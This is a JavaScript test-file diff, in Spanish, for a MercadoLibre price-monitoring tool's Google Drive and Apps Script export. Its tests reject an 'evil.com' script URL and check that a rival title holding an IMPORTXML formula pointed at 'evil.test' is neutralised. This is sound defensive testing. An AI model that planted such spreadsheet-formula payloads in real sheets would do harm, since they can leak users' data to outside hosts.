@@ -12,7 +12,8 @@ import path from 'node:path';
 
 const PUERTO = Number(process.env.MOCK_PORT || 9990);
 let refrescosHechos = 0;
-let demoraRefresh = 0; // ms: simula un refresh lento para forzar carreras entre procesos
+let demoraRefresh = 0;
+const planilla = { recibidos: [], respuestas: [], clave: null }; // Apps Script simulado // ms: simula un refresh lento para forzar carreras entre procesos
 let ultimoItemCreado = null;
 let versionRemota = '9.9.9';
 let itemMLA111 = { catalog_listing: true, category_id: 'MLA1055', price: 42000, currency_id: 'ARS', available_quantity: 10, sold_quantity: 55, status: 'active', condition: 'new', listing_type_id: 'gold_special', permalink: 'https://articulo.mercadolibre.com.ar/x', pictures: [{ secure_url: 'https://http2.mlstatic.com/f1.jpg' }], attributes: [{ id: 'BRAND', value_name: 'Genérica' }], shipping: { logistic_type: 'fulfillment', free_shipping: true } };
@@ -35,6 +36,14 @@ export function crearMockMeli() {
     next();
   };
 
+  // Apps Script simulado: POST → 302 → GET con la respuesta (igual que script.google.com)
+  app.post('/macros/s/:id/exec', express.text({ type: '*/*' }), (req, res) => {
+    let b = null; try { b = JSON.parse(req.body); } catch {}
+    planilla.recibidos.push(b);
+    planilla.respuestas.push(b && planilla.clave && b.clave === planilla.clave ? { ok: true } : { ok: false, error: 'clave' });
+    res.redirect(302, '/macros/echo/' + (planilla.respuestas.length - 1));
+  });
+  app.get('/macros/echo/:n', (req, res) => res.json(planilla.respuestas[Number(req.params.n)]));
   app.get('/pkg-remoto', (_q, res) => res.json({ name: 'x', version: versionRemota }));
   app.post('/oauth/token', async (req, res) => {
     const b = req.body || {};
@@ -486,6 +495,89 @@ async function pruebas() {
     let out = ''; h.stdout.on('data', (x) => { out += x; });
     await new Promise((r) => h.on('exit', r));
     contiene(out, 'Vera', 'Sofía', 'cada 10 min');
+  });
+
+  // ───────────── Resultados del equipo + Google Drive ─────────────
+  const rs = await import('../src/resultados.js');
+  await caso('resultados: tablas reales por trabajador (precio vs el tuyo, tu puesto, rivales, tendencias)', async () => {
+    await T.run({ accion: 'correr' });
+    const t = await T.run({ accion: 'resultados' });
+    contiene(t, 'Lo importante', 'Vera', 'más barato que vos', '39.000', '42.000', 'Martina', 'Tus puestos', 'termo 1 litro: 3º', 'Bruno', 'USURPADOR', 'Sofía', 'termo de vidrio');
+    const soloVera = await T.run({ accion: 'resultados', trabajador: 'Vera' });
+    if (soloVera.includes('Radar de tendencias')) throw new Error('resultados de Vera trae a Sofía');
+  });
+  await caso('resultados: Tomás calcula el ritmo real de ventas y la facturación estimada del rival', async () => {
+    mercado.items.MLA650 = { price: 10000, sold_quantity: 200, available_quantity: 8, status: 'active', title: 'Mate rival' };
+    await T.run({ accion: 'asignar', trabajador: 'Tomás', ref: 'MLA650' });
+    await tr.correrCiclo({ solo: ['ventas'], forzar: true });
+    tr.actualizarEquipo((d) => { const k = Object.keys(d.snapshots).find((x) => x.startsWith('ventas|') && x.includes('MLA650')); d.snapshots[k].t -= 2 * 86400000; d.snapshots[k].datos.base.t -= 2 * 86400000; });
+    mercado.items.MLA650.sold_quantity = 210;
+    await tr.correrCiclo({ solo: ['ventas'], forzar: true });
+    const r = rs.armarResultados().ventas;
+    const fila = r.filas.find((f) => f[0] === 'MLA650');
+    if (!fila || fila[4] !== 10 || fila[6] !== 5 || fila[7] !== 1500000) throw new Error('ritmo mal calculado: ' + JSON.stringify(fila));
+    contiene(await T.run({ accion: 'resultados', trabajador: 'Tomás' }), 'Mate rival', '≈ 5 u./día', '$ 1.500.000');
+  });
+  await caso('drive: instrucciones con clave secreta propia y detección de carpeta', async () => {
+    const t = await T.run({ accion: 'drive' });
+    contiene(t, 'Planilla de Google en vivo', 'planilla-equipo.gs', 'Carpeta de Google Drive', 'sin conectar');
+    const clave = rs.configDrive().clave;
+    if (!clave || clave.length < 20 || !t.includes(clave)) throw new Error('no generó/mostró la clave');
+    contiene(await T.run({ accion: 'drive' }), clave); // estable: no cambia en cada llamada
+  });
+  await caso('drive: rechaza URLs que no son de Apps Script', async () => {
+    for (const u of ['https://evil.com/macros/s/ABCDEFGHIJK/exec', 'http://script.google.com/macros/s/ABCDEFGHIJK/exec', 'https://script.google.com/a/b']) {
+      let msg = ''; try { await T.run({ accion: 'drive', url: u }); } catch (e) { msg = e.message; }
+      contiene(msg, 'Apps Script');
+    }
+    if (!rs.validarScript('https://script.google.com/macros/s/AKfycbx_123-abcDEF/exec?x=1')) throw new Error('rechazó una URL válida');
+  });
+  const urlPlanilla = `http://localhost:${PUERTO}/macros/s/SCRIPT-PRUEBA-123/exec`;
+  await caso('drive: con clave equivocada la planilla rechaza y se informa claro', async () => {
+    process.env.ML_DRIVE_PERMITIR_LOCAL = '1';
+    planilla.clave = 'otra-clave';
+    contiene(await T.run({ accion: 'drive', url: urlPlanilla }), 'la prueba falló', 'rechazó la clave');
+  });
+  await caso('drive: planilla en vivo recibe una pestaña por trabajador (via redirección 302 como Google)', async () => {
+    planilla.clave = rs.configDrive().clave; planilla.recibidos.length = 0;
+    contiene(await T.run({ accion: 'drive', probar: true }), 'enviados a Drive', 'planilla');
+    const b = planilla.recibidos.at(-1);
+    for (const h of ['Vera - Centinela de precios', 'Tomás - Contador de ventas', 'Martina - Vigía de búsquedas', 'Bruno - Cazador de rivales nuevos', 'Sofía - Radar de tendencias']) if (!b.resultados[h]) throw new Error('falta la pestaña ' + h);
+    const vera = b.resultados['Vera - Centinela de precios'];
+    if (vera[0][0] !== 'Objetivo' || !vera.some((f) => f[0] === 'MLA500')) throw new Error('pestaña de Vera vacía');
+    if (vera.some((f) => f.length !== vera[0].length)) throw new Error('filas de distinto ancho (Sheets las rechaza)');
+  });
+  const dirDrive = fs.mkdtempSync(path.join(os.tmpdir(), 'drive-'));
+  await caso('drive: carpeta de Drive para escritorio con CSV por trabajador, Alertas.csv y resumen', async () => {
+    contiene(await T.run({ accion: 'drive', carpeta: dirDrive }), 'conectado', 'Alertas.csv');
+    const c = path.join(dirDrive, rs.CARPETA_NOMBRE);
+    for (const f of ['Alertas.csv', 'Vera - Centinela de precios.csv', 'Sofía - Radar de tendencias.csv', 'Resumen del equipo.md']) if (!fs.existsSync(path.join(c, f))) throw new Error('falta ' + f);
+    contiene(fs.readFileSync(path.join(c, 'Resumen del equipo.md'), 'utf8'), 'Vera', 'más barato que vos');
+    contiene(await T.run({ accion: 'equipo' }), 'planilla en vivo', rs.CARPETA_NOMBRE);
+  });
+  await caso('drive: cada control manda las alertas nuevas a la planilla y a la carpeta', async () => {
+    planilla.recibidos.length = 0;
+    mercado.items.MLA500 = { ...mercado.items.MLA500, price: 37000 };
+    contiene(await T.run({ accion: 'correr', trabajador: 'Vera' }), 'resultados enviados a Google Drive');
+    const b = planilla.recibidos.at(-1);
+    if (!b.alertas.some((f) => String(f[4]).includes('39.000') && String(f[1]).includes('Vera') && f[5] === '')) throw new Error('la planilla no recibió la alerta de precio: ' + JSON.stringify(b.alertas));
+    contiene(fs.readFileSync(path.join(dirDrive, rs.CARPETA_NOMBRE, 'Alertas.csv'), 'utf8'), '37.000', 'Vera');
+  });
+  await caso('drive: un título de rival con fórmula NUNCA se ejecuta en tu planilla (anti inyección)', async () => {
+    mercado.items.MLA500 = { ...mercado.items.MLA500, title: '=IMPORTXML("http://evil.test";"//a")', price: 36000 };
+    planilla.recibidos.length = 0;
+    await T.run({ accion: 'correr', trabajador: 'Vera' });
+    const celdas = JSON.stringify(planilla.recibidos.at(-1));
+    if (/"=IMPORTXML/.test(celdas)) throw new Error('mandó una fórmula ejecutable a la planilla');
+    const archivo = fs.readFileSync(path.join(dirDrive, rs.CARPETA_NOMBRE, 'Vera - Centinela de precios.csv'), 'utf8');
+    if (/(^|,)"?=IMPORTXML/m.test(archivo)) throw new Error('el CSV tiene una fórmula ejecutable');
+    contiene(archivo, "'=IMPORTXML");
+  });
+  await caso('drive: desconectar', async () => {
+    contiene(await T.run({ accion: 'drive', quitar: 'todo' }), 'dejé de enviar');
+    if (await rs.exportarADrive([])) throw new Error('siguió enviando');
+    delete process.env.ML_DRIVE_PERMITIR_LOCAL;
+    fs.rmSync(dirDrive, { recursive: true, force: true });
   });
 
   await caso('instalador: crea el config de Claude desde cero', async () => {
